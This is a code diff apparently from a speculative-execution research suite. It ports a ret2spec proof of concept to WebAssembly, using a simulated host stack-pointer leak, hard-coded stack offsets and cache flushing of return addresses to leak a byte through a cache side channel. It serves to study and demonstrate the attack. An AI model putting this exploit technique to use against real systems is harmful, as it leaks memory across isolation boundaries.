@@ -34,19 +34,18 @@ const std::array<BigByte, 256> *oracle_ptr;
 bool false_value = false;
 // Pointers to stack marks in ReturnsTrue. Used for flushing the return address
 // from the cache.
-std::vector<char *> stack_mark_pointers;
+std::vector<uint64_t> stack_mark_pointers;
 
 // Get a pointer to somewhere in the current stack frame
-static inline SAFESIDE_ALWAYS_INLINE char* getStackPtr(char* guest_stack_ptr) {
+static inline SAFESIDE_ALWAYS_INLINE uint64_t getWasmStackPtr() {
 #ifdef SAFESIDE_WASM
   // on Wasm platforms, we use __wasi_get_host_stack_ptr (which provides a host
   // stack pointer directly, simulating the ability to leak one)
   uint64_t stack_ptr;
   (void)__wasi_get_host_stack_ptr(&stack_ptr);
-  return (char*) stack_ptr;
+  return stack_ptr;
 #else
-  // in non-Wasm platforms, host and guest stack pointers are the same
-  return guest_stack_ptr;
+  return 0;
 #endif
 }
 
@@ -68,10 +67,25 @@ bool ReturnsFalse(int counter) {
   return false_value;
 }
 
+#ifdef SAFESIDE_WASM
+uint64_t ReturnsTrueStackPtr = 0;
+#endif
+
 // Always returns true.
 static bool ReturnsTrue(int counter) {
   char stack_mark = 'a';
-  char* stack_ptr = getStackPtr(&stack_mark);
+  #ifdef SAFESIDE_WASM
+    uint64_t stack_ptr = 0;
+    if (ReturnsTrueStackPtr == 0) {
+      stack_ptr = getWasmStackPtr();
+      stack_ptr += 728 /* correction */;
+    } else {
+      stack_ptr = ReturnsTrueStackPtr - 112 /* ReturnsTrue stack frame size */;
+    }
+    ReturnsTrueStackPtr = stack_ptr;
+  #else
+    uint64_t stack_ptr = reinterpret_cast<uint64_t>(&stack_mark);
+  #endif
   stack_mark_pointers.push_back(stack_ptr);
 
   if (counter > 0) {
@@ -87,7 +101,7 @@ static bool ReturnsTrue(int counter) {
   // own stack mark and the next one. Somewhere there must be also the return
   // address.
   stack_mark_pointers.pop_back();
-  FlushFromDataCache(stack_ptr, stack_mark_pointers.back());
+  FlushFromDataCache64(stack_ptr, stack_mark_pointers.back());
   return true;
 }
 
@@ -95,6 +109,9 @@ char Ret2specLeakByte() {
   CacheSideChannel sidechannel;
   oracle_ptr = &sidechannel.GetOracle();
   const std::array<BigByte, 256> &oracle = *oracle_ptr;
+  #ifdef SAFESIDE_WASM
+  ReturnsTrueStackPtr = 0;
+  #endif
 
   for (int run = 0;; ++run) {
     sidechannel.FlushOracle();
@@ -102,7 +119,12 @@ char Ret2specLeakByte() {
     // Stack mark for the first call of ReturnsTrue. Otherwise it would read
     // from an empty vector and crash.
     char stack_mark = 'a';
-    char* stack_ptr = getStackPtr(&stack_mark);
+    #ifdef SAFESIDE_WASM
+      uint64_t stack_ptr = getWasmStackPtr();
+      stack_ptr += 776 /* correction */;
+    #else
+      uint64_t stack_ptr = reinterpret_cast<uint64_t>(&stack_mark);
+    #endif
     stack_mark_pointers.push_back(stack_ptr);
     ReturnsTrue(kRecursionDepth);
     stack_mark_pointers.pop_back();
